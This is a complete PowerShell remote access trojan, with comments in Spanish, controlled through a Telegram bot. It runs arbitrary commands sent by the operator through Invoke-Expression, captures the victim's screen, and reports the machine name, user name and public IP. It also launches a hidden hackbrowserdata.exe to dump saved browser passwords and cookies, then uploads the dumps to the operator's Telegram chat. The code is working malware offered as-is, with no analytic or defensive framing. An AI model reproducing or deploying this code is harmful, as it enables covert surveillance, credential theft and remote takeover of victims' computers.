param(
    [Parameter(Mandatory=$true)]
    [string]$Token,
    
    [Parameter(Mandatory=$true)] 
    [string]$ChatId
)

# === PREVENIR MULTIPLES INSTANCIAS ===
$mutexName = "Global\TelegramBot_$($Token.Substring(0,10))"
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) {
    Write-Host "[!] Bot ya esta corriendo. Saliendo..."
    exit 1
}

# Diccionario para trackear comandos en ejecucion
$script:RunningCommands = @{}
$script:LastCommandTime = @{}
$cmdLock = New-Object System.Object

trap {
    $mutex.ReleaseMutex()
    $mutex.Dispose()
    exit 1
}

$ErrorActionPreference = 'Continue'
$ApiUrl = "https://api.telegram.org/bot$Token"
$LogFile = Join-Path $env:APPDATA 'CarpetaDos\bot.log'
$HackPath = Join-Path $env:APPDATA 'CarpetaDos\hackbrowserdata.exe'

New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force -ErrorAction SilentlyContinue | Out-Null

function Write-Log {
    param([string]$Message)
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
    Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue
    Write-Host $line
}

# Desactivar webhook y limpiar updates
try {
    Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post | Out-Null
    Start-Sleep -Seconds 2
    # Limpiar updates pendientes
    $updates = Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=-1" -Method Get
    if ($updates.result.Count -gt 0) {
        $lastId = ($updates.result | Select-Object -Last 1).update_id
        Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=$($lastId + 1)" -Method Get | Out-Null
    }
    Write-Log "Webhook desactivado y updates limpiados"
} catch {
    Write-Log "Error limpiando: $($_.Exception.Message)"
}

function Send-Message {
    param([string]$Text, [string]$TargetChatId = $ChatId)
    try {
        if ($Text.Length -gt 4000) { $Text = $Text.Substring(0, 4000) + "`n...(truncado)" }
        
        $body = @{
            chat_id = $TargetChatId
            text = $Text
        } | ConvertTo-Json -Compress
        
        Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $body | Out-Null
        return $true
    } catch {
        Write-Log "Error Send-Message: $($_.Exception.Message)"
        return $false
    }
}

function Send-File {
    param(
        [string]$Path, 
        [string]$Caption="", 
        [string]$TargetChatId = $ChatId
    )
    
    try {
        if (-not (Test-Path $Path)) {
            Write-Log "Archivo no existe: $Path"
            return $false
        }
        
        $fileInfo = Get-Item $Path
        if ($fileInfo.Length -gt 49MB) {
            Send-Message -Text "Archivo muy grande: $($fileInfo.Name)" -TargetChatId $TargetChatId
            return $false
        }
        
        # Metodo nativo PowerShell 5.1 - Form
        $form = @{
            chat_id = $TargetChatId
            document = Get-Item $Path
        }
        
        if ($Caption) {
            $form['caption'] = $Caption
        }
        
        $response = Invoke-RestMethod -Uri "$ApiUrl/sendDocument" -Method Post -Form $form
        Write-Log "Archivo enviado OK: $($fileInfo.Name)"
        return $true
        
    } catch {
        Write-Log "Error Send-File: $($_.Exception.Message)"
        return $false
    }
}

function Get-Info {
    try {
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
    } catch { $ip = "Desconocida" }
    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip"
}

function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        
        # Verificar sesion interactiva
        $explorer = Get-Process "explorer" -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $explorer) {
            Send-Message -Text "Error: No hay sesion de escritorio activa"
            return $false
        }
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bounds = $screen.Bounds
        
        # Crear bitmap con verificacion
        $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        
        # Capturar
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        
        $path = Join-Path $env:TEMP "screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        
        # Guardar
        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        
        # Liberar recursos
        $graphics.Dispose()
        $bitmap.Dispose()
        
        # Verificar archivo
        if (-not (Test-Path $path)) {
            Send-Message -Text "Error: No se pudo guardar screenshot"
            return $false
        }
        
        # Enviar
        $result = Send-File -Path $path -Caption "Screenshot $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        
        # Limpiar
        Remove-Item $path -Force -ErrorAction SilentlyContinue
        
        return $result
        
    } catch {
        Write-Log "Error screenshot: $($_.Exception.Message)"
        Send-Message -Text "Error capturando: $($_.Exception.Message)"
        return $false
    }
}

function Close-BrowserWindows {
    # Cerrar solo ventanas abiertas por hackbrowserdata (procesos recientes)
    $browsers = @("chrome", "msedge", "firefox")
    foreach ($browser in $browsers) {
        try {
            $procs = Get-Process $browser -ErrorAction SilentlyContinue | Where-Object { 
                $_.StartTime -gt (Get-Date).AddMinutes(-1) -and $_.MainWindowTitle -eq ""
            }
            foreach ($proc in $procs) {
                try {
                    $proc.Kill()
                    Write-Log "Cerrado proceso $browser PID $($proc.Id)"
                } catch {}
            }
        } catch {}
    }
}

function Run-Steal {
    param([string]$TargetChatId = $ChatId)
    
    # Verificar si ya esta corriendo
    [void][System.Threading.Monitor]::Enter($cmdLock)
    try {
        if ($script:RunningCommands.ContainsKey('steal') -and $script:RunningCommands['steal']) {
            Send-Message -Text "Ya hay una extraccion en curso..." -TargetChatId $TargetChatId
            return
        }
        $script:RunningCommands['steal'] = $true
    } finally {
        [System.Threading.Monitor]::Exit($cmdLock)
    }
    
    try {
        Send-Message -Text "Iniciando extraccion..." -TargetChatId $TargetChatId
        Write-Log "Iniciando extraccion"
        
        if (-not (Test-Path $HackPath)) {
            Send-Message -Text "Error: hackbrowserdata.exe no encontrado" -TargetChatId $TargetChatId
            return
        }
        
        # Guardar lista de procesos antes
        $beforeBrowsers = Get-Process @("chrome", "msedge") -ErrorAction SilentlyContinue | Select-Object Id, ProcessName
        
        $outputDir = Join-Path $env:TEMP "browser_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$((Get-Random -Maximum 9999))"
        New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
        
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $HackPath
        $psi.Arguments = "dump -d `"$outputDir`" -f json"
        $psi.CreateNoWindow = $true
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.UseShellExecute = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        
        $proc = [System.Diagnostics.Process]::Start($psi)
        
        if (-not $proc.WaitForExit(180000)) {
            $proc.Kill()
            Send-Message -Text "Timeout en extraccion" -TargetChatId $TargetChatId
            return
        }
        
        # Cerrar ventanas de navegador abiertas por hackbrowserdata
        Start-Sleep -Seconds 2
        Close-BrowserWindows
        
        # Buscar JSONs
        $jsonFiles = Get-ChildItem -Path $outputDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
        
        if (-not $jsonFiles) {
            Send-Message -Text "No se generaron archivos" -TargetChatId $TargetChatId
            return
        }
        
        Write-Log "Encontrados $($jsonFiles.Count) archivos"
        Send-Message -Text "Encontrados $($jsonFiles.Count) archivos. Enviando..." -TargetChatId $TargetChatId
        
        $sent = 0
        foreach ($json in $jsonFiles) {
            $zipPath = Join-Path $env:TEMP "$($json.BaseName)_$(Get-Random).zip"
            try {
                Compress-Archive -Path $json.FullName -DestinationPath $zipPath -Force
                
                if (Send-File -Path $zipPath -Caption $json.BaseName -TargetChatId $TargetChatId) {
                    $sent++
                }
                
                Start-Sleep -Milliseconds 1000
            } catch {
                Write-Log "Error con $($json.Name): $($_.Exception.Message)"
            } finally {
                if (Test-Path $zipPath) { Remove-Item $zipPath -Force -ErrorAction SilentlyContinue }
            }
        }
        
        Send-Message -Text "Completado. Enviados: $sent de $($jsonFiles.Count)" -TargetChatId $TargetChatId
        
    } finally {
        # Limpiar
        if ($outputDir -and (Test-Path $outputDir)) {
            Remove-Item $outputDir -Recurse -Force -ErrorAction SilentlyContinue
        }
        
        [void][System.Threading.Monitor]::Enter($cmdLock)
        try {
            $script:RunningCommands['steal'] = $false
        } finally {
            [System.Threading.Monitor]::Exit($cmdLock)
        }
    }
}

function Execute-Cmd {
    param([string]$Command, [string]$TargetChatId = $ChatId)
    
    Write-Log "Ejecutando: $Command"
    
    try {
        $output = Invoke-Expression $Command 2>&1 | Out-String
        
        if ([string]::IsNullOrWhiteSpace($output)) {
            $output = "(sin salida)"
        }
        
        $tempFile = Join-Path $env:TEMP "cmd_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        $content = "Comando: $Command`nFecha: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n$('='*50)`n`n$output"
        [System.IO.File]::WriteAllText($tempFile, $content, [System.Text.Encoding]::UTF8)
        
        Send-File -Path $tempFile -Caption "Resultado: $Command" -TargetChatId $TargetChatId
        
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        
    } catch {
        Send-Message -Text "Error: $($_.Exception.Message)" -TargetChatId $TargetChatId
    }
}

function Process-Command {
    param([string]$Text, [string]$FromChatId, [int]$UpdateId)
    
    # Evitar procesar el mismo update dos veces
    [void][System.Threading.Monitor]::Enter($cmdLock)
    try {
        if ($script:LastCommandTime.ContainsKey($UpdateId)) {
            return  # Ya procesado
        }
        $script:LastCommandTime[$UpdateId] = Get-Date
        
        # Limpiar entradas antiguas (mas de 5 minutos)
        $old = $script:LastCommandTime.GetEnumerator() | Where-Object { $_.Value -lt (Get-Date).AddMinutes(-5) }
        foreach ($o in $old) {
            $script:LastCommandTime.Remove($o.Key)
        }
    } finally {
        [System.Threading.Monitor]::Exit($cmdLock)
    }
    
    Write-Log "Procesando: '$Text'"
    $cmd = $Text.Trim()
    $cmdLower = $cmd.ToLower()
    
    if ($cmdLower -match '^(/?[a-z]+)\s*(.*)') {
        $baseCmd = $Matches[1]
        $args = $Matches[2].Trim()
    } else {
        return
    }
    
    switch ($baseCmd) {
        { $_ -in 'ls', '/ls' } {
            try {
                $items = Get-ChildItem | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
                Send-Message -Text "Directorio: $(Get-Location)`n`n$items"
            } catch {
                Send-Message -Text "Error: $($_.Exception.Message)"
            }
        }
        
        { $_ -in 'cmd', '/cmd' } {
            if ($args) {
                Execute-Cmd -Command $args
            } else {
                Send-Message -Text "Uso: /cmd <comando>"
            }
        }
        
        { $_ -in 'cd', '/cd' } {
            if ($args) {
                try {
                    Set-Location $args -ErrorAction Stop
                    Send-Message -Text "Ahora en: $(Get-Location)"
                } catch {
                    Send-Message -Text "Error: No se pudo ir a '$args'"
                }
            } else {
                Send-Message -Text "Uso: /cd <ruta>"
            }
        }
        
        { $_ -in 'pwd', '/pwd' } {
            Send-Message -Text "Directorio: $(Get-Location)"
        }
        
        { $_ -in 'steal', '/steal' } {
            # Ejecutar en background para no bloquear
            Start-Job -ScriptBlock {
                param($Func, $Chat)
                & $Func -TargetChatId $Chat
            } -ArgumentList ${function:Run-Steal}, $FromChatId | Out-Null
        }
        
        { $_ -in 'captura', '/captura' } {
            Send-Message -Text "Capturando..."
            if (-not (Take-Screenshot)) {
                Send-Message -Text "Error al capturar"
            }
        }
        
        { $_ -in 'info', '/info' } {
            Send-Message -Text (Get-Info)
        }
        
        { $_ -in 'help', '/help' } {
            Send-Message -Text @'
Comandos:
/ls - Listar archivos
/cmd <comando> - Ejecutar comando
/cd <ruta> - Cambiar directorio
/pwd - Directorio actual
/steal - Extraer datos navegadores
/captura - Screenshot
/info - Info del sistema
/help - Esta ayuda
'@
        }
        
        default {
            Write-Log "Comando desconocido: $baseCmd"
        }
    }
}

# Inicio
Write-Log "=== BOT INICIADO ==="
Write-Log "ChatId: $ChatId"

Send-Message -Text "Bot online - $(Get-Info)"

$lastUpdateId = 0

while ($true) {
    try {
        $url = "$ApiUrl/getUpdates?offset=$($lastUpdateId + 1)&limit=1"
        $response = Invoke-RestMethod -Uri $url -TimeoutSec 60
        
        if ($response.ok -and $response.result.Count -gt 0) {
            $update = $response.result[0]
            $lastUpdateId = $update.update_id
            $message = $update.message
            
            if ($message -and $message.text) {
                $msgChatId = [string]$message.chat.id
                if ($msgChatId -eq $ChatId) {
                    Process-Command -Text $message.text -FromChatId $msgChatId -UpdateId $update.update_id
                }
            }
        }
    } catch {
        $err = $_.Exception.Message
        if ($err -like "*409*") {
            try {
                Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=-1" -TimeoutSec 10 | Out-Null
                Start-Sleep -Seconds 3
            } catch {}
        } else {
            Write-Log "Error: $err"
        }
        Start-Sleep -Seconds 2
    }
    
    Start-Sleep -Milliseconds 1500
}
